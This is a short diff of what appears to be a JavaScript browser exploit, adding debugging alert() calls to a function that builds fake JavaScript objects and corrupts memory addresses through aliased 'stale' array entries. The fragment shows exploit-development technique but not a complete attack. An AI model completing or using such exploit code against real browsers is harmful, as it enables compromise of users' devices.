@@ -207,6 +207,7 @@ function go_() {
 					'c': smsh, // var smsh = new Uint32Array(0x10)
 					'd': u2d(0x100, 0)
 				}
+				alert("1");
 				/*
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
@@ -232,6 +233,7 @@ function go_() {
 
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
+				alert("2");
 
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
